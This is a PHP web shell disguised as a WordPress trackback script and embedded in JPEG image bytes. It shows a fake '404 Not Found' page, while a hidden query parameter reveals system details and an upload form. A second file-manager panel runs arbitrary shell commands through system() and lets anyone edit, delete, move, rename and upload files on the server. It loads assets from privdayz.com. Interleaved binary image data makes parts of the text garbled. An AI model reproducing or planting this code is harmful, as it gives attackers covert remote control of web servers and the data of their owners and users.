<?php
error_reporting(0);
/**
 * Response to a trackback.
 *
 * Index of Website Developer
 *
 * Responds with an error or success XML message.
 *
 * For developers: Website debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 *
 * It is strongly recommended that plugin and theme developers.
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * 
 * @since 0.71
 *
 * @param mixed  $error         Whether there was an error.
 *                              Default '0'. Accepts '0' or '1', true or false.
 * @param string $error_message Error message if an error occurred.
 */
echo "<html>
      <head><title>404 Not Found</title></head>
      <h1>Not Found</h1>
      <p>The requested URL ".$_SERVER[REQUEST_URI]." was not found on this server.</p><hr>
      <address>Apache/2.2.22 Sadachil Server at ".$_SERVER['SERVER_NAME']." Port ".$_SERVER['SERVER_PORT'].".</address>
";
/**
 * These can't be directly globalized in version.php. When updating,
 *
 * we're including version.php from another install and don't want
 *
 * these values to be overridden if already set.
 */
if(isset($_GET["sadachil"])){
echo "<body bgcolor='lavender'>
<br>
<font color='red'><b>System: </b></font>
<font color='seagreen'>".php_uname()."</font><br>
<font color ='red'><b>Server IP: </b></font><font color='seagreen'>".gethostbyname($_SERVER['HTTP_HOST'])." </font><br>
<font color='red'><b>Your IP: </b></font>
<font color='seagreen'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font color='red'><b>Destination: </b></font><font color='seagreen '>".$_SERVER[SCRIPT_FILENAME]."</font>";
echo"<form method=post
enctype=multipart/form-data>";
echo"<input type=file name=f><input
name=v type=submit id=v
value=Upload><br>";
if($_POST["v"]==Upload){if(@copy($_FILES
["f"]["tmp_name"],$_FILES["f"]
["name"])){
echo"<font color='blue'><b>File Uploaded: </b></font>".$_FILES
["f"]["name"];
}else{
echo"<b>File Doesn't Uploaded";}}
}
/**
 * If not already configured, `$blog_id` will default to 1 in a single site
 *
 * configuration. In multisite, it will be overridden by default in ms-settings.php.
*/
if(isset($_GET["info"])){
echo "<body bgcolor='lavender'>
<br>
<font color='red'><b>System: </b></font>
<font color='seagreen'>".php_uname()."</font><br>
<font color ='red'><b>Server IP: </b></font><font color='seagreen'>".gethostbyname($_SERVER['HTTP_HOST'])." </font><br>
<font color='red'><b>Your IP: </b></font>
<font color='seagreen'>".$_SERVER['REMOTE_ADDR']."</font><br>
<font color='red'><b>Destination: </b></font><font color='seagreen '>".$_SERVER[SCRIPT_FILENAME]."</font>";
}
/**
 *
 * @global int $blog_id
 *
 * @since 2.0.0
 */
?>
<!--------------------------------------------
blank*
--------------------------------------------->����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������
<!--------------------------------------------
blank*
--------------------------------------------->
/*
/**************************************************************************************/
*blank*
/**************************************************************************************/
*/
<!--------------------------------------------
blank*
--------------------------------------------->
<html>
<head>
<title>
</title>
</head>
<body>
<style type="text/css">
body{
background: #E4E4E4;
color: #666666;
font-family: Verdana;
font-size: 11px;
}
a:link{
color: #33CC99;
}
a:visited{
color: #33CC99;
}
a:hover{
text-decoration: none;
Color: #3399FF;
}
table {
font-size: 11px;
}
</style>
<link href="https://privdayz.com/wp-content/themes/privdaysv1/hacker.css" rel="stylesheet">
<center><img src="https://cdn.privdayz.com/images/logo.jpg" referrerpolicy="unsafe-url" /></center>
<?php
error_reporting (0);
set_time_limit (0);
if (empty ($_GET ['dir'])){
$dir = getcwd ();
}
else {
$dir = $_GET ['dir'];
}
chdir ($dir);
$current = htmlentities ($_SERVER ['PHP_SELF'] . "?dir=" . $dir);
echo "<i>Server: " . $_SERVER ['SERVER_NAME'] . "<br>\n";
echo "Current directory: " . getcwd () . "<br>\n";
echo "Software: " . $_SERVER ['SERVER_SOFTWARE'] . "<br>\n\n</i>\n";
echo "<br>\n\n\n";

echo "<table width = 50%>";
echo "<tr>";
echo "<td><a href = '".$current."&mode=system'>Shell Command</a></td>\n";
echo "<td><a href = '".$current."&mode=create'>Create a new file</a></td>\n";
echo "<td><a href = '".$current."&mode=upload'>Upload file</a></td>\n";
echo "</tr></table>";
echo "<br>\n\n";



$mode = $_GET ['mode'];
switch ($mode){
case 'edit':
$file = $_GET ['file'];
$new = $_POST ['new'];
if (empty ($new)){
$fp = fopen ($file, "r");
$file_cont = fread ($fp, filesize ($file));
$file_cont = str_replace ("<textarea>", "<textarea>", $file_cont);
echo "<form action = '".$current."&mode=edit&file=".$file."' method = 'POST'>\n";
echo "File: ". $file . "<br>\n";
echo "<textarea name = 'new' rows = '30' cols = '50'>".$file_cont."<textarea><br>\n";
echo "<input type = 'submit' value = 'Edit'></form>\n";
}
else {
$fp = fopen ($file, "w");
if (fwrite ($fp, $new)){
echo $file . " edited.<p>";
}
else {
echo "Unable to edit " . $file . ".<p>";
}
}
fclose ($fp);
break;
case 'delete':
$file = $_GET ['file'];
if (unlink ($file)){
echo $file . " deleted successfully.<p>";
}
else {
echo "Unable to delete " . $file . ".<p>";
}
break;
case 'copy':
$src = $_GET ['src'];
$dst = $_POST ['dst'];
if (empty ($dst)){
echo "<form action = '".$current . "&mode=copy&src=" . $src . "' method = 'POST'>\n";
echo "Destination: <input name = 'dst'><br>\n";
echo "<input type = 'submit' value = 'Copy'></form>\n";
}
else {
if (copy ($src, $dst)){
echo "File copied successfully.<p>\n";
}
else {
echo "Unable to copy " . $src . ".<p>\n";
}
}
break;
case 'move':
$src = $_GET ['src'];
$dst = $_POST ['dst'];
if (empty ($dst)){
echo "<form action = '".$current . "&mode=move&src=" . $src . "' method = 'POST'>\n";
echo "Destination: <input name = 'dst'><br>\n";
echo "<input type = 'submit' value = 'Move'></form>\n";
}
else {
if (rename ($src, $dst)){
echo "File moved successfully.<p>\n";
}
else {
echo "Unable to move " . $src . ".<p>\n";
}
}
break;
case 'rename':
$old = $_GET ['old'];
$new = $_POST ['new'];
if (empty ($new)){
echo "<form action = '".$current . "&mode=rename&old=" . $old . "' method = 'POST'>\n";
echo "New name: <input name = 'new'><br>\n";
echo "<input type = 'submit' value = 'Rename'></form>\n";
}
else {
if (rename ($old, $new)){
echo "File/Directory renamed successfully.<p>\n";
}
else {
echo "Unable to rename " . $old . ".<p>\n";
}
}
break;

case 'rmdir':
$rm = $_GET ['rm'];
if (rmdir ($rm)){
echo "Directory removed successfully.<p>\n";
}
else {
echo "Unable to remove " . $rm . ".<p>\n";
}
break;
case 'system':
$cmd = $_POST ['cmd'];
if (empty ($cmd)){
echo "<form action = '".$current . "&mode=system' method = 'POST'>\n";
echo "Shell Command: <input name = 'cmd'>\n";
echo "<input type = 'submit' value = 'Run'></form><p>\n";
}
else {
system ($cmd);
}
break;
case 'create':
$new = $_POST ['new'];
if (empty ($new)){
echo "<form action = '".$current . "&mode=create' method = 'POST'>\n";
echo "<tr><td>New file: <input name = 'new'></td>\n";
echo "<td><input type = 'submit' value = 'Create'></td></tr></form>\n<p>";
}
else {
if ($fp = fopen ($new, "w")){
echo "File created successfully.<p>\n";
}
else {
echo "Unable to create ".$file.".<p>\n";
}
fclose ($fp);
}
break;
case 'upload':
$temp = $_FILES['upload_file']['tmp_name'];
$file = basename($_FILES['upload_file']['name']);
if (empty ($file)){
echo "<form action = '".$current . "&mode=upload' method = 'POST' ENCTYPE='multipart/form-data'>\n";
echo "Local file: <input type = 'file' name = 'upload_file'>\n";
echo "<input type = 'submit' value = 'Upload'>\n";
echo "</form>\n<br>\n\n";
}
else {
if(move_uploaded_file($temp,$file)){
echo "File uploaded successfully.<p>\n";
unlink ($temp);
}
else {
echo "Unable to upload " . $file . ".<p>\n";
}
}
break;



}







clearstatcache ();

echo "<br>\n\n";
echo "<table width = 100%>\n";
$files = scandir ($dir);
foreach ($files as $file){
if (is_file ($file)){

$size = round (filesize ($file) / 1024, 2);
echo "<tr><td>".$file."</td>";
echo "<td>".$size." KB</td>";
echo "<td><a href = ".$current . "&mode=edit&file=".$file.">Edit</a></td>\n";
echo "<td><a href = ".$current . "&mode=delete&file=".$file.">Delete</a></td>\n";
echo "<td><a href = ".$current . "&mode=copy&src=".$file.">Copy</a></td>\n";
echo "<td><a href = ".$current . "&mode=move&src=".$file.">Move</a></td>\n";
echo "<td><a href = ".$current . "&mode=rename&old=".$file.">Remame</a></td></tr>\n";
}
else {
$items = scandir ($file);
$items_num = count ($items) - 2;
echo "<tr><td>".$file."</td>";
echo "<td>".$items_num." Items</td>";
echo "<td><a href = ".$current . "/" . $file.">Change directory</a></td>\n";
echo "<td><a href = ".$current . "&mode=rmdir&rm=".$file.">Remove directory</a></td>\n";
echo "<td><a href = ".$current . "&mode=rename&old=".$file.">Rename directory</a></td></tr>\n";
}
}
echo "</table>\n";
?>
<!--------------------------------------------
blank*
--------------------------------------------->�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��

